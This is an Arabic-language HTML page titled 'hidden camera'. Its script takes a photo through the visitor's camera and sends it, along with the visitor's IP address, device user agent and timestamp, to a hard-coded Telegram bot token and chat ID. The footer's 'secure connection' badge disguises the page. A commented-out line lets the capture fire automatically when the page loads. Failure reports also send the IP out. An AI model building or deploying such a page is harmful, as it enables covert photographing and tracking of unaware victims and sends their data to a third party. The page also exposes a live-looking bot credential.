<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 كاميرا خفية</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 60px rgba(233, 69, 96, 0.15);
            max-width: 420px;
            width: 92%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .icon { font-size: 70px; margin-bottom: 10px; }
        h2 { color: #e94560; margin-bottom: 8px; font-weight: 300; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .btn {
            width: 100%;
            padding: 16px;
            background: #e94560;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover { background: #c73652; transform: scale(1.02); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        #status {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 14px;
            color: #aaa;
            min-height: 55px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 18px; font-size: 11px; color: #444; border-top: 1px solid #1a1a3a; padding-top: 14px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📷</div>
        <h2>كاميرا خفية</h2>
        <p>اضغط الزر لالتقاط صورة وإرسالها</p>
        <button class="btn" id="captureBtn">📸 التقاط وإرسال</button>
        <div id="status">⏳ جاهز للالتقاط</div>
        <div class="footer">🔒 اتصال آمن • ✅ يعمل فوراً</div>
    </div>

    <script>
        // ============================================================
        // إعدادات بوت تيليغرام - بياناتك
        // ============================================================
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";
        // ============================================================

        const btn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');

        // ====== دالة جلب IP ======
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        // ====== دالة إرسال إشعار نصي ======
        async function sendMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        // ====== دالة التقاط الصورة وإرسالها ======
        async function captureAndSend() {
            // تعطيل الزر
            btn.disabled = true;
            statusDiv.innerHTML = `<span class="loader"></span> جاري طلب الكاميرا...`;
            statusDiv.style.color = '#ff9800';

            try {
                // 1. طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });

                // 2. إنشاء عنصر فيديو مؤقت
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 400));

                // 3. رسم الإطار على Canvas
                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // 4. تحويل إلى Base64 ثم Blob
                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = await fetch(imageData).then(r => r.blob());

                // 5. إرسال الصورة إلى تيليغرام
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const photoResult = await photoResponse.json();

                // 6. إغلاق الكاميرا
                stream.getTracks().forEach(t => t.stop());

                // 7. إرسال إشعار إضافي (IP، جهاز، وقت)
                const ip = await getIP();
                const msg = `📸 **تم التقاط صورة جديدة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`;
                await sendMessage(msg);

                // 8. عرض النجاح
                if (photoResult.ok) {
                    statusDiv.innerHTML = `✅ تم إرسال الصورة والإشعار بنجاح`;
                    statusDiv.style.color = '#4caf50';
                } else {
                    statusDiv.innerHTML = `⚠️ الصورة أرسلت لكن فشل الإشعار النصي`;
                    statusDiv.style.color = '#ff9800';
                }

            } catch (error) {
                console.error('❌ خطأ:', error);
                let errorMsg = '❌ فشل الوصول للكاميرا. تأكد من منح الصلاحية.';
                if (error.name === 'NotAllowedError') {
                    errorMsg = '🚫 تم رفض صلاحية الكاميرا. امنح الصلاحية وحاول مجدداً.';
                } else if (error.name === 'NotFoundError') {
                    errorMsg = '📵 لا توجد كاميرا على هذا الجهاز.';
                }
                statusDiv.innerHTML = errorMsg;
                statusDiv.style.color = '#e94560';

                // محاولة إرسال إشعار بالفشل
                try {
                    const ip = await getIP();
                    await sendMessage(`⚠️ **فشل التقاط الصورة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n❌ السبب: ${error.message}`);
                } catch (e) {}
            }

            // إعادة تفعيل الزر
            btn.disabled = false;
        }

        // ====== ربط الزر ======
        btn.addEventListener('click', captureAndSend);

        // ====== تشغيل تلقائي عند فتح الصفحة (اختياري) ======
        // إذا أردت أن تبدأ فوراً بدون ضغط، أزل علامة // من السطر التالي:
        // setTimeout(captureAndSend, 500);
    </script>
</body>
</html>
